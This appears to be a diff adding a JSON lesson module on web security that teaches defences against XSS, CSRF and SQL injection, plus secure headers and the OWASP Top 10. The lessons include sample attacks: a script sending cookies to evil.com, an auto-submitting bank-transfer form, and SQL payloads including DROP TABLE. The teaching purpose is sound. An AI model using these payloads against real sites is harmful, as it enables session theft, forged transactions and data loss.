@@ -1,0 +1,32 @@
+{
+  "id": "security",
+  "order": 18,
+  "title": "Security Engineering",
+  "description": "Defend your applications against real-world attacks. XSS, CSRF, SQL injection, CSP, secure headers, and the OWASP Top 10.",
+  "topics": [
+    {
+      "id": "xss",
+      "title": "Cross-Site Scripting (XSS)",
+      "order": 1,
+      "content": "### Injecting Malicious Scripts into Your Pages\n\nXSS occurs when an attacker injects JavaScript into a page that other users view. Their script runs in the victim's browser with full access to cookies, localStorage, and the DOM.\n\n#### Types of XSS\n\n**Stored XSS**: Malicious script is saved in the database and served to all users.\n\n```html\n<!-- Attacker submits this as a comment: -->\n<script>fetch('https://evil.com/steal?c=' + document.cookie)</script>\n\n<!-- Your app renders it as: -->\n<p><script>fetch('https://evil.com/steal?c=' + document.cookie)</script></p>\n<!-- Every visitor's session cookie is now stolen. -->\n```\n\n**Reflected XSS**: Script injected via URL parameter.\n\n```\nhttps://yoursite.com/search?q=<script>alert(document.cookie)</script>\n```\n\n#### Prevention\n\n```js\n// 1. NEVER use innerHTML with user data\n// BAD:\ndiv.innerHTML = userInput;\n\n// GOOD: textContent escapes HTML\ndiv.textContent = userInput;\n\n// 2. Sanitize when HTML rendering is required\nimport DOMPurify from 'dompurify';\nconst safe = DOMPurify.sanitize(userMarkdown);\ndiv.innerHTML = safe;\n\n// 3. Content Security Policy header (blocks inline scripts)\n// Content-Security-Policy: default-src 'self'; script-src 'self'\n\n// 4. React is safe by default (escapes all JSX expressions)\n<p>{userInput}</p> // Safe — React escapes this\n<p dangerouslySetInnerHTML={{ __html: userInput }} /> // DANGEROUS\n```\n\n---\n"
+    },
+    {
+      "id": "csrf",
+      "title": "Cross-Site Request Forgery (CSRF)",
+      "order": 2,
+      "content": "### Tricking Users into Making Requests They Didn't Intend\n\nIf your app uses cookies for auth, an attacker can create a page that makes requests to your API using the victim's cookies.\n\n```html\n<!-- Evil page: attacker tricks user into visiting this -->\n<form action=\"https://yourbank.com/transfer\" method=\"POST\">\n  <input name=\"to\" value=\"attacker-account\" />\n  <input name=\"amount\" value=\"10000\" />\n</form>\n<script>document.forms[0].submit();</script>\n<!-- User's browser sends the request WITH their session cookie! -->\n```\n\n#### Prevention\n\n**SameSite cookie attribute** (best modern defense):\n\n```js\nres.cookie('session', token, {\n  httpOnly: true,\n  secure: true,\n  sameSite: 'strict', // Cookie not sent on cross-site requests\n});\n\n// 'lax' (default): cookie sent on top-level navigation but not forms\n// 'strict': cookie never sent on cross-site requests\n// 'none': always sent (requires Secure)\n```\n\n**CSRF tokens** (for older apps or where SameSite isn't enough):\n\n```js\nimport csrf from 'csurf';\n\napp.use(csrf({ cookie: true }));\n\napp.get('/form', (req, res) => {\n  // Embed token in every form\n  res.render('form', { csrfToken: req.csrfToken() });\n});\n\n// Frontend: include token in POST request header\nawait fetch('/api/transfer', {\n  method: 'POST',\n  headers: { 'X-CSRF-Token': csrfToken },\n  body: JSON.stringify({ amount: 100 }),\n});\n```\n\n---\n"
+    },
+    {
+      "id": "sql-injection",
+      "title": "SQL Injection",
+      "order": 3,
+      "content": "### The #1 Most Dangerous Web Vulnerability\n\nSQL injection is when user input is interpreted as SQL code instead of data.\n\n```js\n// DANGEROUS: string interpolation\nconst query = `SELECT * FROM users WHERE email = '${req.body.email}'`;\n\n// Attacker inputs: ' OR '1'='1\n// Query becomes: SELECT * FROM users WHERE email = '' OR '1'='1'\n// Returns ALL users!\n\n// Attacker inputs: '; DROP TABLE users; --\n// Query becomes: SELECT * FROM users WHERE email = ''; DROP TABLE users; --\n// Deletes the entire users table.\n```\n\n#### Prevention: Always Use Parameterized Queries\n\n```js\n// PostgreSQL (pg)\nconst result = await client.query(\n  'SELECT * FROM users WHERE email = $1',\n  [req.body.email] // Value is passed separately, never interpolated\n);\n\n// MySQL (mysql2)\nconst [rows] = await connection.execute(\n  'SELECT * FROM users WHERE email = ?',\n  [req.body.email]\n);\n\n// Prisma ORM (parameterized by default)\nconst user = await prisma.user.findUnique({\n  where: { email: req.body.email }\n});\n\n// If you must write raw SQL with Prisma:\nconst result = await prisma.$queryRaw`\n  SELECT * FROM users WHERE email = ${req.body.email}\n`; // Template literal tag handles escaping\n```\n\n**Rule**: Never concatenate user input into a SQL string. Always use parameterized queries or a trusted ORM.\n\n---\n"
+    },
+    {
+      "id": "secure-headers",
+      "title": "Secure Headers and OWASP Top 10",
+      "order": 4,
+      "content": "### Defense in Depth with HTTP Headers\n\n```js\nimport helmet from 'helmet';\n\n// helmet sets all of these at once\napp.use(helmet());\n\n// What it sets:\n// Strict-Transport-Security: max-age=15552000     → HTTPS only\n// X-Frame-Options: SAMEORIGIN                      → No clickjacking\n// X-Content-Type-Options: nosniff                  → No MIME sniffing\n// Referrer-Policy: no-referrer                     → Don't leak URLs\n// Permissions-Policy: geolocation=()               → Block APIs\n// Content-Security-Policy: default-src 'self'      → Block injections\n```\n\n#### OWASP Top 10 (2021)\n\n| # | Vulnerability | Prevention |\n| :--- | :--- | :--- |\n| A01 | Broken Access Control | Enforce RBAC, test authorization |\n| A02 | Cryptographic Failures | HTTPS, bcrypt for passwords |\n| A03 | Injection (SQL/XSS) | Parameterized queries, sanitize output |\n| A04 | Insecure Design | Threat model during design phase |\n| A05 | Security Misconfiguration | Helmet, remove defaults, patch deps |\n| A06 | Vulnerable Components | `npm audit`, Dependabot |\n| A07 | Auth Failures | Rate limit, MFA, strong passwords |\n| A08 | Software Integrity | Sign artifacts, verify checksums |\n| A09 | Logging Failures | Log all auth events and errors |\n| A10 | SSRF | Validate/allowlist outbound URLs |\n\n---\n"
+    }
+  ]
+}
